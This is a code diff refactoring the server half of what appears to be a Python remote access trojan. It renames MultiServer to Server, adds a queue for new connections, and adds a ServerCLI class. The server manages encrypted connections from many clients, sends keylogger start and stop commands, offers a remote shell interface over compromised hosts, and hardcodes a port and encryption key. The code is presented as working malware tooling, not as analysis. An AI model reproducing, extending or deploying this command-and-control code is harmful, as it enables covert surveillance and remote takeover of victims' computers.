@@ -10,6 +10,7 @@ import time
 import traceback
 from datetime import datetime
 from typing import Tuple
+from queue import Empty, Queue
 
 from cryptography.fernet import Fernet
 
@@ -348,7 +349,7 @@ class Client():
         self.send_json(['STOP_KEYLOGGER'])
         return self.recv_json()
 
-    def _get_info(self) -> Tuple[str]:
+    def get_info(self) -> Tuple[str]:
         """ Get Client Info """
 
         # returns (
@@ -388,7 +389,7 @@ class Client():
         return tuple(self.recv_json())
 
 
-class MultiServer():
+class Server():
     """ Multi-connection Server class """
 
     def __init__(self, port: int, key: bytes) -> None:
@@ -397,6 +398,7 @@ class MultiServer():
         self.socket = None
         self.thread = None
         self.event = threading.Event()
+        self.queue = Queue()
         self.fernet = Fernet(key)
         self.clients = []
 
@@ -411,7 +413,7 @@ class MultiServer():
             time.sleep(5)
             self.socket_bind()
 
-    def accept_connections(self, _print: bool) -> None:
+    def _accept(self) -> None:
         """ Accepts incoming connections """
         while not self.event.is_set():
             try:
@@ -423,14 +425,12 @@ class MultiServer():
 
                 client = Client(conn, address, self.fernet)
                 self.clients.append(client)
-                if _print:
-                    msg = f'Connection has been established: {address[0]} ({address[-1]})'
-                    lines = len(msg)*'-'
-                    print(f'\n{lines}\n{msg}\n{lines}')
+                self.queue.put(client)
             except Exception as error:
                 logging.debug(errors(error))
+        self.event.clear()
 
-    def start(self) -> None:
+    def start(self, _print: bool = False) -> None:
         """ Start the Server """
 
         self.socket = socket.socket()
@@ -438,7 +438,7 @@ class MultiServer():
 
         self.socket_bind()
 
-        self.thread = threading.Thread(target=self.accept_connections, args=(True,))
+        self.thread = threading.Thread(target=self._accept)
         self.thread.daemon = True
         self.thread.start()
 
@@ -457,7 +457,7 @@ class MultiServer():
         except Exception:
             pass
 
-    def refresh_connections(self) -> None:
+    def refresh(self) -> None:
         """ Refreshes connections """
         clients = self.clients[:]
         for client in clients:
@@ -467,9 +467,41 @@ class MultiServer():
             except Exception:
                 self.disconnect(client)
 
+
+class ServerCLI(Server):
+    """ CLI for the server """
+
+    def __init__(self, key: bytes, port: int) -> None:
+        Server.__init__(self, key, port)
+
+        self._print_event = threading.Event()
+
+        self.conn_thread = threading.Thread(target=self.__on_connection)
+        self.conn_thread.daemon = True
+        self.conn_thread.start()
+
+    def __on_connection(self) -> None:
+        """ Print message when a client connects """
+
+        while not self._print_event.is_set():
+            try:
+                client = self.queue.get(timeout=3)
+            except Empty:
+                continue
+            msg = f'Connection has been established: {client.address[0]} ({client.address[1]})'
+            lines = len(msg)*'-'
+            print(f'\n{lines}\n{msg}\n{lines}')
+            self.queue.task_done()
+        self._print_event.clear()
+
+    def close(self) -> None:
+        """ Close the CLI and shutdown the server """
+        self._print_event.set()
+        self.stop()
+
     def list_connections(self) -> None:
         """ List all connections """
-        self.refresh_connections()
+        self.refresh()
         print('----- Clients -----')
         for i, client in enumerate(self.clients):
             print('   '.join(map(str, (i, ) + client.address)))
@@ -505,7 +537,7 @@ class MultiServer():
     def shell(self, client: Client) -> None:
         """ Remote Shell Interface """
         # returns None
-        system, home, user = client._get_info()
+        system, home, user = client.get_info()
         hostname = client.address[-1]
 
         while 1:
@@ -675,12 +707,12 @@ class MultiServer():
             if select == 'restart':
                 print('Restarting Session...')
                 client.restart_session()
-                self.refresh_connections()
+                self.refresh()
                 return True
             elif select == 'disconnect':
                 print('Disconnecting Client...')
                 client.disconnect()
-                self.refresh_connections()
+                self.refresh()
                 return True
         elif '--b' in command:
             return True
@@ -730,7 +762,7 @@ class MultiServer():
                         except Exception as error:
                             print(f'Connection lost: {errors(error)}')
                             self.disconnect(client)
-                            self.refresh_connections()
+                            self.refresh()
                     else:
                         print('Invalid Selection.')
                 elif command == '--s':
@@ -747,6 +779,6 @@ class MultiServer():
 
 
 if __name__ == '__main__':
-    server = MultiServer(8000, b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=')
+    server = ServerCLI(8000, b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=')
     server.start()
     server.menu()
